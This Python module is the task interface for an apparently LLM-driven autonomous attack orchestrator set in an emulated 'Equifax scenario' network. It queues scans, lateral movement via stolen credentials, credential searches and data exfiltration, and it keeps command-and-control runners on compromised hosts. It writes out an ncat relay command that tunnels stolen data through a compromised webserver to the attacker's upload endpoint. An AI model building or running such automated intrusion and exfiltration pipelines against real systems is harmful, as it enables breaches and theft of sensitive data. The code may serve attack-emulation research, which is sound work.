"""
High-level task API the LLM calls inside <task> blocks.

These 5 functions are the ONLY interface between the planning layer (LLM) and
the execution layer (agents). The LLM never touches agents or runners directly.
"""

# ---------------------------------------------------------------------------
# Module-level state (lives for the lifetime of one orchestrator run)
# ---------------------------------------------------------------------------

_task_queue: list[dict] = []
_runners: dict[str, object] = {}  # IP -> CncRunner, filled by lateral_move on success

# Services and agents — set once by init(), then used by _dispatch_one()
_env = None
_cnc = None
_graph = None
_scan_agent = None
_lateral_agent = None
_findinfo_agent = None
_exfil_agent = None

_attacker_ip: str = "10.0.0.50"
_web_intnet_ip: str = "192.168.1.2"   # webserver's intnet-facing IP, used in exfil relay URL
_exfil_port: int = 9000               # ExfilReceiver port on the attacker
_relay_port: int = 9001               # ncat relay port on the intermediate webserver


# ---------------------------------------------------------------------------
# init() — called once by orchestrator before the planning loop starts
# ---------------------------------------------------------------------------

def init(env, cnc, graph, scan_agent, lateral_agent, findinfo_agent, exfil_agent,
         attacker_ip: str = "10.0.0.50", web_intnet_ip: str = "192.168.1.2"):
    global _env, _cnc, _graph
    global _scan_agent, _lateral_agent, _findinfo_agent, _exfil_agent
    global _attacker_ip, _web_intnet_ip
    _env = env
    _cnc = cnc
    _graph = graph
    _scan_agent = scan_agent
    _lateral_agent = lateral_agent
    _findinfo_agent = findinfo_agent
    _exfil_agent = exfil_agent
    _attacker_ip = attacker_ip
    _web_intnet_ip = web_intnet_ip
    _task_queue.clear()
    _runners.clear()


# ---------------------------------------------------------------------------
# 5 task functions — the LLM calls these inside <task> blocks.
# They only enqueue; no real work happens here.
# ---------------------------------------------------------------------------

def scan(subnet: str):
    """Queue a subnet scan."""
    _task_queue.append({"task": "scan", "subnet": subnet})


def lateral_move(target_ip: str):
    """Queue a lateral move to target_ip."""
    _task_queue.append({"task": "lateral_move", "target_ip": target_ip})


def find_information(host_ip: str):
    """Queue a credential/information search on a compromised host."""
    _task_queue.append({"task": "find_information", "host_ip": host_ip})


def escalate_privilege(host_ip: str):
    """Queue a privilege escalation on a compromised host."""
    _task_queue.append({"task": "escalate_privilege", "host_ip": host_ip})


def exfiltrate_data(host_ip: str, data_path: str):
    """Queue a data exfiltration from a compromised host."""
    _task_queue.append({"task": "exfiltrate_data", "host_ip": host_ip, "data_path": data_path})


# ---------------------------------------------------------------------------
# dispatch — called by the orchestrator after exec()-ing each <task> block
# ---------------------------------------------------------------------------

def dispatch_all_queued_tasks() -> list[dict]:
    """Run every task in the queue sequentially and return the results."""
    tasks = _task_queue.copy()
    _task_queue.clear()
    return [_dispatch_one(t) for t in tasks]


def _dispatch_one(task: dict) -> dict:
    t = task["task"]

    if t == "scan":
        subnet = task["subnet"]
        result = _scan_agent.run(subnet)
        return {"task": f"scan {subnet}", **result}

    elif t == "lateral_move":
        target_ip = task["target_ip"]

        # Find the best path to this target through hosts we already control
        paths = _graph.get_possible_attack_paths(target_ip)
        if not paths:
            return {
                "task": f"lateral_move {target_ip}",
                "success": False,
                "message": f"No reachable path to {target_ip} — scan more or compromise a pivot first",
            }

        best = paths[0]                        # shortest path first
        pivot_ip = best[-2]                    # second-to-last hop = our launch pad

        # If the launch pad is the attacker itself, no runner needed (direct exploit)
        pivot_runner = None if pivot_ip == _attacker_ip else _runners.get(pivot_ip)

        # Pick a credential that can open target_ip (if one exists)
        cred = None
        for c in _env.get_credentials():
            if target_ip in getattr(c, "can_access_hosts", []):
                cred = c
                break

        result = _lateral_agent.run(target_ip, credential=cred, pivot_runner=pivot_runner)
        if result["success"]:
            _runners[target_ip] = result["data"]["runner"]
        return {"task": f"lateral_move {target_ip}", **result}

    elif t == "find_information":
        host_ip = task["host_ip"]
        runner = _runners.get(host_ip)
        if runner is None:
            return {
                "task": f"find_information {host_ip}",
                "success": False,
                "message": f"No C&C runner for {host_ip} — lateral_move to this host first",
            }
        result = _findinfo_agent.run(runner, found_on_host=host_ip)
        return {"task": f"find_information {host_ip}", **result}

    elif t == "escalate_privilege":
        # Equifax scenario does not require privilege escalation (stub — bug 5 fix)
        host_ip = task["host_ip"]
        return {
            "task": f"escalate_privilege {host_ip}",
            "success": False,
            "message": "EscalatePrivilege not needed in this environment",
        }

    elif t == "exfiltrate_data":
        host_ip = task["host_ip"]
        data_path = task["data_path"]
        runner = _runners.get(host_ip)
        if runner is None:
            return {
                "task": f"exfiltrate_data {host_ip}",
                "success": False,
                "message": f"No C&C runner for {host_ip} — lateral_move to this host first",
            }

        # Ask the attack graph for the shortest path from data host back to attacker
        exfil_route = _graph.get_shortest_exfil_path(host_ip)
        # exfil_route = [host_ip, ..., attacker_ip]

        if len(exfil_route) > 2:
            # Segmented network: data host cannot reach attacker directly.
            # Start an ncat TCP relay on the intermediate webserver so the database
            # can push data out through the web bridge (same pattern as equifax_baseline).
            intermediate_ip = exfil_route[1]   # e.g. "10.0.0.2" (webserver extnet IP)
            intermediate_runner = _runners.get(intermediate_ip)
            if intermediate_runner:
                relay_cmd = (
                    f"nohup ncat -l -p {_relay_port} "
                    f"--sh-exec 'ncat {_attacker_ip} {_exfil_port}' "
                    f">/dev/null 2>&1 & sleep 1 && echo relay-ok"
                )
                intermediate_runner.run(relay_cmd)
                # DB can only reach webserver via its intnet-facing IP
                exfil_url = f"http://{_web_intnet_ip}:{_relay_port}/upload"
            else:
                exfil_url = f"http://{_attacker_ip}:{_exfil_port}/upload"
        else:
            exfil_url = f"http://{_attacker_ip}:{_exfil_port}/upload"

        result = _exfil_agent.run(runner, data_path, receiver_url=exfil_url)
        return {"task": f"exfiltrate_data {host_ip} {data_path}", **result}

    else:
        return {"task": t, "success": False, "message": f"Unknown task type: {t}"}
